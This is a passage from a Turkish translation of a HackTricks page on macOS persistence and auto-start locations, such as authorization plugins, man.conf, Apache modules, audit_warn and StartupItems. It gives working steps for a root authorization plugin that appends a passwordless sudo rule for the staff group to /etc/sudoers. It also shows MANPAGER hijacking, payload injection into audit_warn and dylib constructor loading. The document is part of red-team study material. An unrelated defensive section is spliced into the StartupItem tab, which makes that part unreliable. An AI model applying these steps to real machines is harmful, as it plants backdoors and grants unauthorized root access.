__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Bündeyi** yüklenecek konuma **taşıyın**:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Son olarak bu Eklentiyi yüklemek için **kuralı** ekleyin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** yetkilendirme çerçevesine dış mekanizmanın çağrılması gerekeceğini belirtecektir. Dahası, **`privileged`** root tarafından yürütülmesini sağlayacaktır.

Şununla tetikleyin:
```bash
security authorize com.asdf.asdf
```
Ve sonra **personel grubunun sudo erişimi olmalıdır** (`/etc/sudoers` dosyasını okuyun doğrulamak için).

### Man.conf

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak root olmanız ve kullanıcının man kullanması gerekmektedir
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* **`/private/etc/man.conf`**
* Root gerekli
* **`/private/etc/man.conf`**: Her man kullanıldığında

#### Açıklama ve Sızma

Yapılandırma dosyası **`/private/etc/man.conf`**, man belgelendirme dosyalarını açarken kullanılacak ikili betiği gösterir. Bu nedenle yürütülecek bir arka kapı her zaman kullanıcı belgeleri okumak için man kullandığında değiştirilebilir.

Örneğin **`/private/etc/man.conf`** içinde ayarlanmış:
```
MANPAGER /tmp/view
```
Ve ardından `/tmp/view`'i şu şekilde oluşturun:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Açıklama**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Kum havuzunu atlamak için faydalı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak root olmanız ve apache'nin çalışıyor olması gerekmektedir
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)
* Httpd'nin yetkileri yok

#### Konum

* **`/etc/apache2/httpd.conf`**
* Root gerekli
* Tetikleyici: Apache2 başlatıldığında

#### Açıklama ve Sızma

`/etc/apache2/httpd.conf` dosyasında bir modülü yüklemek için aşağıdaki gibi bir satır ekleyebilirsiniz:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Bu şekilde derlenmiş modülleriniz Apache tarafından yüklenecektir. Tek yapmanız gereken ya **geçerli bir Apple sertifikası ile imzalamak** ya da sisteme yeni bir güvenilir sertifika eklemek ve onunla **imzalamak**.

Ardından, gerektiğinde sunucunun başlatılacağından emin olmak için şunu çalıştırabilirsiniz:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
```bash
Dylb için kod örneği:
```
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM denetim çerçevesi

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak root olmanız, auditd'nin çalışıyor olması ve bir uyarıya neden olmanız gerekmektedir
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* **`/etc/security/audit_warn`**
* Root gerekli
* **Tetikleyici**: Auditd bir uyarı algıladığında

#### Açıklama ve Sızma

Auditd bir uyarı algıladığında **`/etc/security/audit_warn`** betiği **çalıştırılır**. Bu nedenle kendi yükünüzü ekleyebilirsiniz.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
### Başlangıç Öğeleri

{% hint style="danger" %}
**Bu artık kullanımdan kaldırıldı, bu yüzden bu dizinlerde hiçbir şey bulunmamalı.**
{% endhint %}

**StartupItem**, ya `/Library/StartupItems/` ya da `/System/Library/StartupItems/` dizinleri içinde bulunması gereken bir dizindir. Bu dizin oluşturulduğunda, içermesi gereken iki belirli dosya bulunmalıdır:

1. Bir **rc betiği**: Başlangıçta çalıştırılan bir kabuk betiği.
2. Çeşitli yapılandırma ayarlarını içeren, özellikle `StartupParameters.plist` adında bir **plist dosyası**.

Başlangıç işlemi tarafından bunları tanıması ve kullanması için hem rc betiğinin hem de `StartupParameters.plist` dosyasının doğru şekilde **StartupItem** dizini içine yerleştirildiğinden emin olun.

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %} 

## MacOS Otomatik Başlatma Konumları

Bu bölümde, MacOS'ta otomatik olarak başlatılan uygulamaların bulunduğu farklı konumları ele alacağız. Bu konumlar genellikle kötü niyetli yazılımların sisteme sızmasında kullanılabilecek potansiyel zayıf noktalardır. Bu konumları düzenli olarak kontrol etmek ve gereksiz uygulamaları devre dışı bırakmak, MacOS güvenliğini artırmak için önemlidir.

### 1. Kullanıcı Oturum Açılışında Başlatılan Uygulamalar

Kullanıcı oturum açıldığında başlatılan uygulamalar, genellikle `System Preferences > Users & Groups > Login Items` bölümünde görüntülenebilir ve düzenlenebilir.

### 2. Launch Agents ve Launch Daemons

`Launch Agents` ve `Launch Daemons`, sistem düzeyinde otomatik başlatılan işlemleri yönetmek için kullanılır. Bu konumlar genellikle `/Library/LaunchAgents`, `/Library/LaunchDaemons`, `~/Library/LaunchAgents` ve `/System/Library/LaunchAgents` gibi dizinlerde bulunur.

### 3. Cron ve Launchd Görevleri

Cron ve Launchd, belirli zamanlarda veya belirli olaylar gerçekleştiğinde işlemleri otomatik olarak başlatmak için kullanılır. Bu görevler genellikle `/etc/crontab`, `/etc/cron.d`, `/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.weekly`, `/etc/launchd.conf`, `/etc/launchd.d` gibi dizinlerde bulunabilir.

### 4. Finder Kısayolları

Finder kısayolları, belirli bir klasör açıldığında veya bir cihaz bağlandığında otomatik olarak başlatılan işlemleri içerebilir. Bu kısayollar genellikle `~/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments` ve `~/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments.sfl2` gibi dosyalarda bulunabilir.

Bu konumları düzenli olarak kontrol etmek ve gereksiz uygulamaları devre dışı bırakmak, MacOS sisteminin güvenliğini artırmak için önemlidir. 

{% endtab %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
### ~~emond~~

{% hint style="danger" %}
Bu bileşeni macOS'ta bulamıyorum, daha fazla bilgi için yazılıma bakın
{% endhint %}

Yazılım: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Apple tarafından tanıtılan **emond**, geliştirilmemiş veya muhtemelen terkedilmiş gibi görünen bir günlükleme mekanizmasıdır, ancak hala erişilebilir durumda. Mac yöneticileri için özellikle faydalı olmasa da, bu belirsiz hizmet, tehdit aktörleri için hafif bir kalıcılık yöntemi olarak hizmet edebilir ve muhtemelen çoğu macOS yöneticisi tarafından fark edilmeyebilir.

Varlığından haberdar olanlar için, **emond**'un kötüye kullanımını tespit etmek kolaydır. Bu hizmet için sistem LaunchDaemon'ı, yürütülecek betikleri tek bir dizinde arar. Bunun incelenmesi için aşağıdaki komut kullanılabilir:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Yazı: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Konum

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Root gereklidir
* **Tetikleyici**: XQuartz ile

#### Açıklama ve Sızma

XQuartz artık macOS'ta **kurulu değil**, bu yüzden daha fazla bilgi için yazıya bakın.

### ~~kext~~

{% hint style="danger" %}
Kext'i yüklemek bile kök olarak **çok karmaşıktır**, bu yüzden bunu kum havuzlarından kaçmak veya kalıcılık için düşünmeyeceğim (elbette bir açığız varsa)
{% endhint %}

#### Konum

Bir KEXT'i başlangıç öğesi olarak yüklemek için, aşağıdaki konumlardan birine **yüklü olması gerekir**:

* `/System/Library/Extensions`
* OS X işletim sistemi tarafından derlenmiş KEXT dosyaları.
* `/Library/Extensions`
* 3. taraf yazılım tarafından yüklenen KEXT dosyaları

Şu anda yüklenmiş kext dosyalarını listeleyebilirsiniz:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Daha fazla bilgi için [**çekirdek uzantıları kontrol etme bölümüne bakın**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Konum

* **`/usr/local/bin/amstoold`**
* Root gereklidir

#### Açıklama ve Sömürü

Görünüşe göre `/System/Library/LaunchAgents/com.apple.amstoold.plist`'den gelen `plist` bu ikiliyi kullanıyordu ve bir XPC servisini açığa çıkarıyordu... sorun şu ki ikili mevcut değildi, bu yüzden bir şey yerleştirebilir ve XPC servisi çağrıldığında ikili çağrılacaktı.

Artık macOS'ta bunu bulamıyorum.

### ~~xsanctl~~

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Konum

* **`/Library/Preferences/Xsan/.xsanrc`**
* Root gereklidir
* **Tetikleyici**: Servis çalıştırıldığında (nadiren)

#### Açıklama ve sömürü

Bu betiği çalıştırmak pek yaygın değil gibi görünüyor ve macOS'ta bile bulamadım, bu yüzden daha fazla bilgi istiyorsanız yazıya bakın.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Bu modern MacOS sürümlerinde çalışmıyor**
{% endhint %}

Başlangıçta **çalıştırılacak komutları buraya yerleştirmek de mümkündür.** Tipik bir rc.common betiği örneği:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Kalıcılık teknikleri ve araçları

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.**
* **Hacking püf noktalarınızı göndererek HackTricks** (https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR'lar gönderin.

</details>
